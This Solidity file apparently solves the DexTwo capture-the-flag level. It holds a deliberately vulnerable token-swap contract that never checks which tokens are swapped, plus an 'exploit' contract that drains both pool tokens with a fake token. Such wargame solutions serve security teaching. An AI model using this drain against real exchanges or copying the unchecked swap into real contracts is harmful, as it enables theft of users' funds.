// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";
import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol';

contract DexTwo is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function add_liquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  } 

  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  address private _dex = 0xab0E75b12cd82F15F6093167390023fFdd038988;
  constructor(string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
        _mint(address(0x0399df044DD3FE5E5B28759662f3f76cd335131F), initialSupply);
        _mint(_dex,100);
        // _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}

interface Idex{
    function approve(address spender, uint amount) external;
    function swap(address from, address to, uint amount) external;
}

interface Swapper {
    function transferFrom(address sender, address recipient, uint256 amount) external;
    function approve(address spender, uint256 amount) external returns (bool);
}

contract exploit{
    Idex dexInstance = Idex(0xab0E75b12cd82F15F6093167390023fFdd038988);
    Swapper memeToken;

    function approvetokens(Swapper addr) external{
        memeToken = addr;
        memeToken.approve(address(dexInstance), 500);
        dexInstance.swap(address(memeToken),address(0x0dFbc99FF6842E653705f57A198954000AB6E381),100);
        dexInstance.swap(address(memeToken),address(0x2Ac03523611798712Ea950449428b4C4e30EF6bD), 200);
    }
}